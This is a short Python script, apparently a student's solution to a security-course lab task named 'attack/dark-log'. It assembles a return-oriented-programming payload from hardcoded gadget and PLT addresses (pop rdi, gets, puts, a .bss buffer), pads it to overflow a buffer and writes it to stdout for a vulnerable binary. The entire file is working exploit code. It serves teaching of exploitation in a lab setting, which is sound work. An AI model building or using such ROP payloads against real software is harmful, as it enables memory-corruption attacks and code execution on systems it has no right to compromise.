#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

ret = 0x401526
pop_rdi = 0x4018a3
gets_plt = 0x401570
puts_plt = 0x401540
bss = 0x602100

#payload = ret.to_bytes(8,"little")
payload = pop_rdi.to_bytes(8,"little")
payload += bss.to_bytes(8,"little") #rdi的值
payload += gets_plt.to_bytes(8,"little") 

payload += pop_rdi.to_bytes(8,"little")
payload += bss.to_bytes(8,"little") 
payload += puts_plt.to_bytes(8,"little") 

payload = payload.ljust(0x100,b'A') + 0xa8.to_bytes(4,"little")

sys.stdout.buffer.write(payload + b'\n')
sys.stdout.buffer.flush() 

sys.stdout.buffer.write(b'Hope A will be your grade!' + b'\n')
sys.stdout.buffer.flush() 
